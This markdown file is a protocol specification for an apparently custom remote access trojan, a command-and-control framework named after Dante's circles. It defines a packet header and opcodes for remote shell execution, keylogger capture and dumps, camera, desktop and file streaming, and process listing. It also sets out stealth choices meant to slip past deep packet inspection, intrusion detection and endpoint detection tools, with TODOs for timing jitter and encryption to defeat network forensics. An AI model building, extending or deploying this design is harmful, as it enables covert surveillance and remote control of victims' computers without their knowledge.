# 📜 2ème Cercle: PROTOCOL.md (Luxure)

## 1. Overview
The communication protocol is a custom, strictly binary protocol encapsulated within TCP streams. It is designed to be lightweight, extensible, and resistant to partial packet delivery (TCP fragmentation).

## 2. Packet Structure (C++ Layout)
Every message transmitted between the Server and the Client consists of a fixed-size `Header` followed by a variable-size `Payload`.

```cpp
#pragma pack(push, 1)
struct PacketHeader {
    uint32_t magic;         // 0xDEADBEEF (Network byte order)
    uint16_t opcode;        // Command type (e.g., CMD_PING, CMD_KEYLOG_DATA)
    uint32_t payload_size;  // Size of the following payload in bytes
    uint32_t checksum;      // CRC32 of the payload to verify integrity
};
#pragma pack(pop)
```

## 3. Opcodes (Commands & Events)
### System & Control
- `0x0000` : PING — Heartbeat request (Server -> Client)
- `0x0001` : PONG — Heartbeat response (Client -> Server)
- `0x0002` : SYS_REQ_INFO — System Information Request (Server -> Client)
- `0x0003` : SYS_RES_INFO — System Information Response (Client -> Server)
- `0x0004` : CMD_EXEC — Execute Shell Command (Server -> Client)
- `0x0005` : CMD_RES — Shell Command Output, chunked (Client -> Server)
- `0x0006` : PROC_LIST_REQ — Process List Request (Server -> Client)
- `0x0007` : PROC_LIST_RES — Paged Process List Response (Client -> Server)

### Surveillance (Gourmandise)
- `0x0100` : Start Keylogger (Server -> Client)
- `0x0101` : Stop Keylogger (Server -> Client)
- `0x0102` : Keylogger Buffer Dump (Client -> Server)
- `0x0103` : Start/Stop File Stream (Server <-> Client)
- `0x0104` : Start/Stop Camera/Desktop Event Stream (Server <-> Client)

## 4. Data Structures

### 4.1 Paged Process List (Opcode 0x0007)
Designed for stealth and resilience, this data structure allows the Agent to transmit the process list in manageable chunks.

| Offset | Size | Type | Description |
|--------|------|------|-------------|
| 0      | 2    | uint16 | Page Index (0-indexed) |
| 2      | 1    | uint8  | Is Last Page (1 = Yes, 0 = No) |
| 3      | 2    | uint16 | Entries in this Page |
| 5      | -    | Seq    | Sequence of Process Entries |

**Process Entry Layout:**
- `uint32_t pid`
- `uint16_t name_len`
- `char name[name_len]` (No null terminator)

### 4.2 Remote Shell Command (Opcode 0x0004) — CMD_EXEC
Sent by the Server to the Agent to request execution of a shell command.

| Offset | Size | Type | Description |
|--------|------|------|-------------|
| 0      | 2    | uint16 | Command length (N) |
| 2      | N    | char[] | Command string (no null terminator) |

### 4.3 Remote Shell Response (Opcode 0x0005) — CMD_RES
Sent by the Agent to the Server, carrying chunked command output.

| Offset | Size | Type | Description |
|--------|------|------|-------------|
| 0      | 1    | uint8  | Status: `0` = data chunk, `1` = end of output, `2` = error |
| 1      | 2    | uint16 | Data length (N) |
| 3      | N    | char[] | Output chunk |

**Chunking Design Rationale (Stealth):**
- Output is transmitted in fixed **4096-byte chunks** (system page size).
- This value was chosen deliberately: it matches the default `libc` I/O buffer size and is
  identical to the read buffer used by SSH, HTTPS, and most legitimate system daemons.
  Signature-based DPI (Deep Packet Inspection) and EDR tools cannot distinguish these
  packets from normal encrypted application traffic.
- A single large response blob (e.g. 500KB) is a network anomaly flagged by most IDS systems.
  4096-byte sequential packets are indistinguishable from a standard streaming protocol.

> **TODO Circle 7 (Violence):** Evolve the execution model from blocking `popen()` to a
> non-blocking pipe integrated into the `select()` event loop to support long-running commands
> without stalling the Agent's main loop.

> **TODO Circle 7 (Violence):** Add inter-chunk **jitter** (randomized microsecond delay between
> `CMD_RES` packets) to break timing-based traffic fingerprinting.

> **TODO Circle 8 (Ruse et Tromperie):** Wrap all packet payloads in symmetric encryption
> (e.g. AES-256-GCM) to defeat DPI content inspection and prevent payload reconstruction
> by network forensics tools.

## 5. Endianness
All multi-byte integers (`uint16_t`, `uint32_t`) MUST be transmitted in Network Byte Order (Big-Endian). Implementations MUST use explicit bit-shifting serialization (not `htonl`/`htons` combined with pointer casting, which is not portable across architectures).

## 6. Security Constraints
- **MAX_PAYLOAD_SIZE**: 10,485,760 bytes (10MB). Any packet with a `payload_size` exceeding this limit MUST be rejected to prevent memory exhaustion (OOM) attacks.
- **Magic Validation**: Deserializers MUST verify the `magic` value (0xDEADBEEF) before allocating any memory for the payload.
- **CMD_EXEC Sanitization**: The Agent MUST NOT apply any sanitization to the received command — it executes what the Server sends. Access control is the Server operator's responsibility.